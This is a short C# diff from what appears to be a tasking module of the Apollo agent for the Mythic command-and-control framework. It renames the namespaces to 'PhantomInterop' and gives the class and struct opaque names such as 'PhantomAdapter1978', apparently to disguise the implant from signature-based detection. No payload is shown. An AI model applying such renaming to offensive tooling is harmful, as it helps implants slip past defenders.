@@ -6,18 +6,18 @@
 
 #if UNLINK
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 
 
 namespace Tasks
 {
-    public class unlink : Tasking
+    public class PhantomAdapter1978 : Tasking
     {
         [DataContract]
-        internal struct UnlinkParameters
+        internal struct PhantomMonitorACEB
         {
             [DataMember(Name = "link_info")]
             public PeerInformation ConnectionInfo;
